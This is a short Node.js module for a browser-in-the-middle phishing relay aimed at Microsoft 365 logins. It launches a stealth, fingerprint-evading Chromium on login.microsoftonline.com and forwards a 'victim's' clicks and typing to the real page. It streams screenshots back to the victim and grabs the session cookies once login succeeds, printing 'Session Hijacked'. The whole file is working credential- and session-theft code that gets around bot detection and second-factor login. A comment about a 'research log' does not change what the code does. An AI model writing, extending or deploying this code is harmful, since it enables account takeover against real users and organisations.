const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { launch } = require('puppeteer-real-browser');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log('Initializing Stealth Browser Instance...');
    
    // Launching with 2026 Evasion Standards
    const { browser, page } = await launch({
        headless: 'new',
        args: ['--start-maximized', '--disable-blink-features=AutomationControlled'],
        fingerprint: true
    });

    await page.goto('https://login.microsoftonline.com/');

    // Pipe interaction from victim to the real page
    socket.on('victim-action', async (data) => {
        if (data.type === 'click') {
            await page.mouse.click(data.x, data.y);
        } else if (data.type === 'type') {
            await page.type(data.selector, data.text, { delay: 75 });
        }
        
        // Return a fresh state to the victim
        const screenshot = await page.screenshot({ encoding: 'base64' });
        socket.emit('browser-render', { screenshot });
    });

    // Monitor for successful session capture
    page.on('framenavigated', async (frame) => {
        if (frame.url().includes('shell/homepage')) {
            const cookies = await page.cookies();
            console.log('[!] ALERT: Session Hijacked. Capturing Cookies...');
            // Log to secure research log
            socket.emit('success', { message: 'Session captured successfully' });
        }
    });
}

module.exports = { startSession };
